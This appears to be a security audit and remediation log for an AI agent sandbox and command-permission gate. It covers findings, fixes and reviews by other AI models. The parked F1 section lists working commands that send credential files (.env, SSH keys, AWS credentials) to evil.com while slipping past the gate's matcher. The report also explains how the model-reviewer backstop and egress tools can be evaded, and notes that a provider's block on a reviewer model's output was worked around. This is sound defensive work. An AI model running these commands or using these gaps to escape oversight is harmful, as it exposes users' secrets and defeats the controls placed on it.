| M2 | Medium (conditional) | **DOWNGRADED to L8** after reading permission-system 27.0.0: `boundaryValue()` is `realpathSync`-canonicalized, so the symlink bypass does not apply where it mattered. Lexical `resolve()` at `index.ts:647` still confirmed, with three narrow residual paths. Also extended: `request.cwd` is attacker-influenced on the sandbox surface, so the cwd-derived half of the protected set is mis-anchored. |
| M3 | Low (downgraded) | **Unchanged as written** — but see L6: on the external-worker path the control is absent rather than thin. |
| L1 | Low, CONFIRMED | **Unchanged.** `register` checks only `startsWith("/")` and length ≤ 4096 (`external-supervisor.ts:118`); `seen` and `workers` are only ever added to. |
| L2 | Low, CONFIRMED | **Unchanged.** `createMandatoryDenyPlaceholders` runs at launcher `:196`, `await registerWorker()` at `:207`. |
| L3 | Low, PARTIAL | **Confirmed, expanded.** `::1` parse correction verified; evidence-only status now *proven* by tracing `destinationHost` to its only three consumers. Range list extended with Teredo and `100::/64`; IPv4-mapped explicitly cleared as a non-finding. |
| Former L4 | RESOLVED | **Re-confirmed on the pinned 0.0.73.** Version caveat removed; a worktree nuance was recorded that produces no gap. |
| Former L5 | REFUTED | **REFUTATION WITHDRAWN → promoted to M4.** The refutation was wrong. See M4 for timings and a validated patch. |
| I1 | Info, CONFIRMED | **Unchanged.** |
| I2 | Info, CONFIRMED | **Partially superseded by M5.** "Drift-gate jobs intentionally install `@latest` (acceptable for a drift gate)" holds for `latest-compat` but not for `model-gate`, which runs the same unpinned installs with the full provider secret set in job-level `env`. |

### New findings in this pass

M4 (regex DoS, with a validated fix), M5 (CI secret exposure), L6 (external policy drops secret denials), L7 (launcher trusts its own environment), plus the `request.cwd` extension to M2.

### Checked and clean (recorded to bound future passes)

- **Grant replay:** `boundaryRequestHash` covers all of `BoundaryRequest` except the `id` nonce; no replay gap.
- **Override/break-glass state machine:** `authorize` → `consume` is one-shot per `(session, requestHash)` via `#used`; break-glass is scope-keyed and TTL-checked; critical denials cannot be recovered through the ordinary override path (`riskLevel !== "critical"` filters in both `list` and `authorize`).
- **Shell injection in the spawn paths:** correct in both.
- **IPv4-mapped IPv6 addresses:** correctly blocked by Node's `BlockList`.
- **pi-sandbox project config:** no workspace-reachable surface exists.
- **Broker init validation:** `isInitMessage`/`isNetworkResponse` type-check every field before use; the broker SIGKILLs the target on IPC disconnect.

### Dependency verification — closed 2026-08-27

Both dependency limits recorded earlier are now closed. `@anthropic-ai/sandbox-runtime@0.0.73` and `@gotgenes/pi-permission-system@27.0.0` — the exact versions in `package-lock.json` — were fetched with `npm pack` and extracted to `/tmp/audit-src` (tarball extraction only: no install, no lifecycle scripts, nothing added to this checkout).

**SRT 0.0.73 — four claims settled, all against the pinned version:**

| Claim | Outcome |
|---|---|
| H1 — `allowWrite` → rw `--bind`, `denyWrite` → `--ro-bind`, deny wins | **Confirmed.** denyWrite args are emitted last and layer over write binds (`:642`, `:1208`). |
| H1 — mandatory dangerous-file scan is cwd-rooted on Linux | **Confirmed.** `linuxGetMandatoryDenyPaths` takes `process.cwd()` (`:172`) and uses it as the ripgrep root (`:232`). |
| H2 — no env stripping | **Corrected.** No `--clearenv` exists, but 0.0.73 *does* have `--unsetenv` behind an unused `credentials` config. Finding intact; mechanism text and recommended fix both updated. |
| Former-L4 — `.git/hooks` mandatory deny | **Confirmed** on both platforms, plus a worktree nuance that produces no gap. |

**permission-system 27.0.0 — M2 settled and downgraded to L8.** `boundaryValue()` is symlink-resolved via `realpathSync`, so the finding's central open question is answered in the codebase's favour. Three narrow residual paths documented under L8.

### Remaining limit

Dynamic testing of the sandbox itself is still not done. This checkout has no `node_modules`, and the host is macOS 15.7.4 with `sandbox-exec` but no `bwrap` and no running container daemon, so the Linux bubblewrap path cannot be exercised locally at all. All findings above are established by source reading plus standalone execution of the exact regex and `BlockList` constructions copied from source (M4, L3) — not by observing a live sandbox. To close it: run `npm ci` then `npm test` + `npm run gate:external-isolation` locally for the macOS Seatbelt leg, and push the branch so `compat-latest.yml` (which installs `bubblewrap` on `ubuntu-latest`) covers the Linux leg — the platform where H1 is worst, since the cwd-rooted mandatory-deny scan is Linux-specific.

---

## Remediation log (2026-08-27)

Five findings fixed test-first against a green `npm ci` baseline (139 pi-auto-review + 93 pi-sandbox tests, 0 failures, type check clean, `gate:external-isolation` PASS). Every fix began with a test that failed for the intended reason.

| Finding | Change | Test |
|---|---|---|
| **M4** | `envPath` segment class now excludes `/`, plus an anchor alternation for absolute/dot-relative paths (`pi-auto-review/src/policy.ts`) | Linearity assertion across 4 path roots at 2 000 repetitions, plus true-positive/negative corpus (`policy.test.ts`) |
| **M5** | `model-gate` secrets moved off the job onto the single gate step, gating switched to a `steps.optin.outputs` boolean, all actions pinned to commit SHAs | `workflow-hardening.test.ts` parses the YAML and asserts all three properties |
| **L6** | Launcher policy extracted to `createExternalWorkerPolicy`; `denyWrite` now a proven superset of `createDefaultPolicy`'s, including workspace secret denials, `logs`, and the legacy config path | `external-policy.test.ts` superset + explicit-entry assertions |
| **L7** (partial) | `PI_SANDBOX_EXTERNAL_ALLOW_READ` sanitized (absolute + contained by workspace or agent dir); `PI_SANDBOX_EXTERNAL_REAL_PI_BINARY` shape-checked | `external-policy.test.ts` containment, traversal, and binary-shape cases |
| **L8** | `protectedWriteHardDeny` exported, takes an explicit `trustedCwd`, canonicalizes **both** sides before comparing | `protected-write.test.ts` symlink-to-file, symlink-to-directory, trusted-cwd, and allow-ordinary-writes cases |

Supporting refactor: the workspace secret helpers moved to `workspace-secrets.mjs` (+ `.d.mts`) so `policy.ts` and the `.mjs` launcher share one implementation instead of duplicating the deny list. `yaml` was added as a devDependency — the workflow test had been relying on it resolving transitively.

### Three things this pass got wrong, and what they cost

**The "validated" M4 one-character fix was wrong.** The standalone harness used in the third-pass audit only ever tested relative paths, so it green-lit a patch that broke `curl -d @/workspace/.env.local`: once the segment class stops swallowing `/`, absolute and dot-relative paths need the explicit anchor alternation that `credentialDirectoryPath` already had. The repo's own test suite caught it immediately. A harness that reproduces a regex outside its call site proves the *timing* claim, not the *correctness* claim.

**The first L7 attempt introduced a startup regression.** Requiring `realPi === process.execPath` looked like the strong fix, but the injecting side sets that variable to the *parent's* `execPath` while the launcher runs under `#!/usr/bin/env node`. Those legitimately differ under nvm, volta, or a bundled runtime, so the check would have failed worker startup closed on real installs. It was softened to an absolute/exists/is-a-file check, and `usableRealPiBinary` now documents precisely what it does not promise. Identity cannot be established from inside the launcher; the residual is recorded above.

**The first workflow guard test failed for the wrong reason.** It was one `dirname` short and threw ENOENT, which looks identical to a real failure in the runner output. Confirming *why* a red test is red is not ceremony.

### Deliberately not done

`denyWrite` entries for `npm/`, `auth.json`, `mcp.json`, `trust.json`, `skills/`, `agents/`, and `bin/` — the defense-in-depth half of H1 — were left out. They would materially reduce H1's blast radius even while `agentDir` stays writable, but denying `auth.json` could break a worker refreshing an OAuth token, and denying `npm/` could break legitimate extension loading. Both are exactly the empirical questions L9 blocks. Scope was held to parity with the already-shipped default policy, which is provably safe because the main-agent sandbox has run with it since 0.11.1.

---

## Review round 2 (2026-08-27) — `zai/glm-5.3`, and the parked F1 report

Round 1 (`openai-codex/gpt-5.6-sol`) completed its analysis but the provider blocked the final message under its cybersecurity policy. Its reasoning summaries were recovered from the transcript and three findings verified by hand: a dangling-symlink bypass (High), an unsanitized `sessionDir` (Medium), and a wrong SHA annotation (Low). All three are fixed in `250c523`, `fd0605d`, `20f53f0`.

Round 2 reviewed the fixed tree and returned **ship-with-fixes**. Its findings are recorded below with their disposition.

### Two corrections to round 2's framing

**F1's nine bypasses are not regressions.** All nine were run against base `3c02333` and all nine were already allowed there. The branch neither introduced nor worsened them.

**A hard-deny false negative is not an allow.** `broker.ts:73-95` — when `hardDeny` returns undefined the request falls through to break-glass and then the model reviewer, which can still deny or defer. The upstream comment states the design intent plainly: *"best-effort hardening, not a completeness guarantee: readers not on the list still fall through to the contextual matchers below or the dynamic reviewer."* The backstop is weak, because the default reviewer is `reasoning: "low"` / `maxTokens: 256` (see I1) — but the gate abstaining is not the gate opening.

### Disposition

| ID | Severity | Disposition |
|---|---|---|
| F1 | High | **Parked** — see the report below. Pre-existing; needs a matcher redesign, not a patch |
| F2 | High | Same issue as **H1**. Round 2's argument accepted in part — see below |
| F3 | Medium | **Fixed** (`df679aa`) — 16KB cap; the "linear" claim withdrawn as false |
| F4 | Medium | **Fixed** (`1cc2178`) — fails closed on hop exhaustion *and* on kernel ELOOP |
| F5 | Medium | **Accepted, documented** — TOCTOU between check and write. Mitigated by OS `denyWrite` when pi-sandbox is active; unmitigated on the permission-system-only surface |
| F6 | Medium | **Accepted risk, Linux only** — see below |
| F7 | Low | **Fixed** (`3ea69ed`) — literal tuples restored |
| F8 | Low | **Fixed** (`1cc2178`) — no fallback to `request.cwd` |
| F9 | Info | Pre-existing; tracked with F1 |

### F6 — accepted risk (Linux external-worker bootstrap)

`8a56fc8` added `denyWrite` entries for `<agentDir>/pi-sandbox.json`, `<agentDir>/logs`, and `<agentDir>/extensions/pi-sandbox/config.json` **without** adding them to the launcher's placeholder-seeding loop, which exists precisely because bubblewrap cannot create a missing nested bind target under the read-only home mask. On a Linux install lacking those paths, external-worker bootstrap may fail closed.

Not fixed: this repository's owner runs macOS only. The fix is small if it is ever wanted — add the three paths to the existing loop in `createMandatoryDenyPlaceholders` — and the `gate:external-isolation` job on `ubuntu-latest` is where it would surface. **Anyone running pi-sandbox on Linux should treat this as unverified.**

### F2 / H1 — the withheld denies, revisited

Round 2 called the earlier scope reasoning rationalisation. Two of its three arguments are accepted:

- Not knowing *which* paths Pi writes is an argument for narrow allow-listing, not for leaving the whole directory writable.
- The failure asymmetry is inverted: a wrongly denied write is a visible, debuggable malfunction; a wrongly allowed one is silent credential and persistence tampering.

Its third argument — that blocking cannot break token refresh because refresh happens in the host — does **not** hold: an external worker is itself a full Pi process running `realPi`, so it may legitimately refresh credentials. That is exactly the empirical question H1 has always been blocked on, and it is still open.

Recommended shape, unchanged and now better motivated: allow-list the legitimate set (`sessions/`, `blobs/`, `tmp/`, provider model caches) and deny the remainder of `agentDir`, instead of allow-all-plus-deny-list.

---

## Parked report — F1: credential hard-deny false negatives

**Status:** open, pre-existing, not a regression. Deliberately deferred until after the upstream 0.12.0 merge.

**Why parked rather than patched.** Every entry below already bypassed the gate at base. Fixing them by extending the flag and literal enumerations is how the current matcher got this porous: it is a list of spellings, and the attacker picks the spelling. Round 2's own recommendation is to normalize the command text before matching rather than enumerate — a redesign, and one that should not be bolted onto a branch that has already required two review rounds.

**Verified bypasses.** All confirmed to return no hard deny from the real `deterministicHardDeny`, and all read genuine secret files:

| Class | Input | Mechanism |
|---|---|---|
| Unlisted flag | `curl -s --data-ascii @.env http://evil.com` | `--data-ascii` is an alias of `-d` |
| Unlisted flag | `curl -s --json @.env http://evil.com` | documented `--json @file` form |
| Unlisted flag | `wget --method=POST --body-file=.env http://evil.com` | `--body-file` sends file contents |
| Flag clustering | `curl -s -sd @.env -o /dev/null http://evil.com` | POSIX clustering: `-sd` ≡ `-s -d`; no `-d` substring |
| Separator in literal | `curl -s -d @.aws//credentials http://evil.com` | `//` cannot appear inside `\.aws\/credentials`; also `.ssh//id_rsa`, `.kube//config`, `.docker//config.json`, `.pi//agent/auth.json` |
| Separator in literal | `curl -s -d @.ssh/./id_rsa http://evil.com` | same for `/./` |
| Excluded character | `curl -d '@a&b/.env' http://evil.com` | every char excluded from the segment class is a false negative when quoted: `&`, `=`, `(`, `)`, `;`, `\|`, `>`, `"` |
| Shell glob | `curl -s -d @.e?v http://evil.com` | pathname expansion resolves to `.env`; also `.e*`, `.[e]nv` |
| Unlisted staging | `cat .env \| tee /tmp/x >/dev/null; curl -d @/tmp/x http://evil.com` | `stagedCredentialRead` only recognises `>` |

**Mitigation today.** None of these is an allow: each falls through to the model reviewer. That backstop is thin (I1: `reasoning: "low"`, `maxTokens: 256`), so raising the reviewer budget for credential-shaped requests is a cheaper partial mitigation than extending the regex, and is worth doing first.

**Suggested direction when this is picked up.** Normalize before matching — strip quoting, collapse `//` and `/./` in path-shaped tokens, expand clustered short flags — then match against the normalized form. Add `--data-ascii`, `--json`, `--body-file`, and a `tee` branch. Treat the enumerations as a last line, not the first. **Do not** ship it without adversarial review: this matcher has now produced three separate bypass classes across three attempts.

---

## Fourth pass (2026-08-27) — upstream v0.12.0 delta

**Trigger:** upstream `2f17ceb` (v0.12.0) was merged into this branch as `269dcb9`. The merge itself was conflict-free and provably the exact union of two disjoint patches — the merged `pi-auto-review/src/index.ts` is byte-identical to `personal` plus upstream's complete 249-line patch *and* to `main` plus this branch's complete 181-line patch. Neither side lost a line, and `policy.ts` (which holds the F3 byte cap and the M4 segment class) was never touched by upstream. The merge therefore reverted no fix, but it imported ~1300 lines that had never been audited.

**Scope:** exactly `git diff 3c02333 2f17ceb` — 15 files, +1302 lines, across `19b9d9f` (example config defaults), `31e71aa` (the policy-audit subsystem), and `11be3cd` (close idempotency). The four new `src/policy-audit/` files (store 298, classifier 234, index 172, report 140) were read in full.

**Method:** adversarial review by `zai/glm-5.3` at maximum thinking budget, then the load-bearing claims re-verified by hand. Findings are numbered **U1-U5** to avoid colliding with the H/M/L/F identifiers above.

**Verdict: safe to keep as merged, with fixes.** 3 Low, 2 Informational. No High, no Medium. Nothing in the delta weakens an enforcement path, persists credential material, or introduces an injection primitive.

### Findings

| ID | Severity | Finding | Disposition |
|---|---|---|---|
| U1 | Low | Example permission config widens `web_search` and `get_search_content` from the implicit `ask` fallback to `allow` | **Fixed** — both set back to `"ask"` |
| U2 | Low | The audit store follows symlinks on its directory, key, and DB | **Open** — folded into H1 |
| U3 | Low | Retention pruning runs only on the write path | **Open** |
| U4 | Info | DB is briefly `0644` before `chmod 0600` | **No action** — no exposure |
| U5 | Info | `close()` is not terminal; a late `record()` reopens the store | **Open** |

### U1. Example config widens two egress-capable surfaces to `allow` [CONFIRMED — FIXED]

`19b9d9f` added `todo`, `web_search`, `get_search_content` as `"allow"` and `fetch_content` as `"ask"` to `examples/pi-permission-system.config.example.json`. Verified by hand that the first three are genuine `ask`→`allow` transitions rather than restatements of a default: the pinned permission system's fallback for unlisted tools is `DEFAULT_UNIVERSAL_FALLBACK: PermissionState = "ask"` (`permission-manager.ts:43`). A prompt-injected model in a session configured from this example therefore gets an unprompted egress channel — `web_search` query text leaves the machine to the search provider with workspace data encoded in it.

Severity is Low, not Medium, because the **shipped default is unaffected**: `src/config.json` gained only the `policyAudit` block. Only users who copy the example are exposed. The change is not mentioned in `CHANGELOG.md`.

**Fixed here:** `web_search` and `get_search_content` set to `"ask"`. `todo` (local task list) keeps `"allow"`; `fetch_content` keeps upstream's `"ask"`, which is correct — the exfiltration-capable fetcher should prompt. No test or script reads this file, so nothing else moves. This is a deliberate divergence from upstream and will produce a small conflict on the next merge; that is preferable to silently shipping a reference config that disables the prompt on an egress tool.

### U2. The audit store trusts pre-existing filesystem state [CONFIRMED — folded into H1]

`store.ts:74-77` (directory), `:85-99` (`loadOrCreateKey`), `:110-111` (DB open). All three primitives were reproduced by probe on Node 26.7.0:

- **Key substitution.** `openSync(O_CREAT|O_EXCL)` correctly refuses a pre-existing symlink, but the `EEXIST` fallback then `chmodSync` + `readFileSync` through the link, so the host proceeds with an attacker-chosen 32-byte HMAC key. Data collected under that key has reversible project-path and rule-pattern pseudonymization.
- **DB redirect.** `new DatabaseSync(path)` follows a symlinked DB; a corrupt or wrong-`schema_version` target makes `open()` throw, disabling collection for every later session.
- **Directory redirection.** `mkdirSync(recursive)` succeeds over an existing directory symlink, and the subsequent `chmodSync(dir, 0700)` retargets the link's target.

The precondition is write access to `~/.pi/agent/extensions/pi-auto-review/`. The model cannot obtain it (the directory is inside the local write-deny set) and neither can an unprivileged local user (`0700` inside the user's home) — but **an H1-compromised external worker can**, because `allowWrite` still contains `agentDir`. This grants such an attacker nothing they do not already have; it is recorded because the delta *adds* four new poisonable artifacts under `agentDir`, which enlarges H1's blast radius.

**Fix, when H1 is addressed:** `lstat` the directory, key, and DB at open and refuse any symlink (or open the key `O_NOFOLLOW` and treat `ELOOP` as fatal). The structural fix is denying `extensions/pi-auto-review/` while `agentDir` remains writable — the same allow-list redesign H1 already needs.

### U3. Retention is enforced only on the write path [CONFIRMED — open]

`pruneIfNeeded` (`store.ts:238-244`) has exactly one caller, `record` (`:219`); neither `open()` nor `query()` prunes. Setting `policyAudit.enabled: false` — a permitted project-level tightening — therefore freezes the database at its current contents indefinitely, and rows outlive the documented 180-day retention. This is a privacy and documentation-honesty gap, not an exploitation path. Fix: prune at the end of `initialize()` and at the top of `query()`.

### U4 / U5 [CONFIRMED — no action / open]

**U4:** `node:sqlite` creates the DB at `0644 & ~umask`, and `store.ts:111` chmods to `0600` immediately after construction and **before** `initialize()` writes any row; the file is already inside a `0700` directory. WAL and SHM inherit `0600`, re-asserted by `secureSidecars()` after every commit. No row ever exists in a readable mode, and the README's permission claims are accurate. No action.

**U5:** the `11be3cd` close-idempotency fix is itself correct — three concurrent `close()` calls with a queued record produced no throw and no double-close. But `getStore` re-creates `storePromise` after `close()` clears it and `record` does not check for a closed controller, so a decision arriving after shutdown reopens the DB. Since pi emits `session_shutdown` on session *reload*, a stale in-flight decision can leave one live SQLite handle until the next shutdown. No data loss and no unhandled rejection. Fix: a controller-level `closed` latch making `record()` a no-op.

### Refuted — recorded to bound future passes

Each was an explicit interrogation target and each was answered against source or by execution:

- **No credential material reaches disk.** Every persisted column is fixed-vocabulary or an HMAC-SHA256 digest; request IDs, project paths and matched patterns are hashed, and the test suite byte-scans DB + WAL + SHM for raw strings. The key is an **HMAC pseudonymization key, not an at-rest encryption key**, and the README describes it as such — the suspected overstated-protection claim does not exist.
- **No SQL injection.** All statements are `?`-parameterized through Node's builtin `node:sqlite` (`store.ts:121`, hence the `engines: >=22.13.0` bump); the sole interpolated fragment is a fixed two-way ternary containing no attacker input.
- **No classifier ReDoS witness** across 17 worst-case patterns up to 5 MB; worst observed 51 ms with clean linear scaling. See the caveat below.
- **No path from audit failure to a permission verdict.** `record()` runs after the decision is broadcast, fire-and-forget, its queue catch backed by the host's per-handler try/catch. Unwritable directory, missing `node:sqlite`, corrupt DB, bad key length and closed-DB errors were each tested: all disable collection with one warning.
- **No markdown, ANSI or prompt injection through the report** — all rendered strings are fixed-vocabulary, hex fingerprints or ISO dates, and the report goes to `pi.appendEntry`, never to the model.
- **The model cannot invoke `/auto-review-policy-audit`** on the current host: extension `registerCommand` commands go to the TUI registry, while the model-facing `slash_command` tool is fed only file-based commands and prompt templates. Arguments are bounded regardless.
- **No tighten-only bypass** in the new `policyAudit` project-config block.

**Interaction with existing findings:** H1's blast radius grows by U2's four artifacts. H2, M1, F1, F5, F6 and L9: no interaction — the subsystem reads no environment variables and adds no sandbox-surface code.

### Test-quality assessment

Upstream's tests pin security properties rather than the happy path: file modes asserted, DB/WAL/SHM byte-scanned for raw strings, tighten-only including re-enable rejection, corruption-not-rebuilt, cross-project isolation, dedup, and argument bounds. Gaps worth closing: the `11be3cd` concurrent-close fix has **no test** (verified only by probe); no symlink-tamper test (U2); no retention-when-disabled test (U3); and — notably — **no classifier linearity regression test**, so the M4 lesson recorded in this document was not applied to the new regexes.

### Confidence and limits

Verified by execution on Node 26.7.0: file modes under hostile umask, symlink behaviour of every open path, classifier timing across 17 patterns, and concurrent close. Verified by hand afterwards: the U1 default transitions against `permission-manager.ts:43`, the unchanged shipped default in `src/config.json`, and the `node:sqlite` driver identity. Some `file:line` citations in the reviewer's report drift by one or two lines from current HEAD; the substance held everywhere it was sampled.

**Not established:** sustained multi-session WAL contention (the busy-then-disable behaviour is inferred from `busy_timeout=75` plus 3 retries, never observed under load); behaviour on network filesystems with broken POSIX locking; Node 22.13-25 specifically, since probes ran on 26.7.0.

**Where this may be wrong:** the ReDoS refutation is an absence of a witness, not a proof — and M4 is precisely the case where hand-inspection and a passing harness both returned the wrong answer. The cheap mitigation is to cap the command length fed to `classifyPermission`, mirroring the existing `MAX_HARD_DENY_COMMAND_BYTES` cap. U2's severity assumes H1 is the only way to plant files in the audit directory; another local write primitive would widen it.

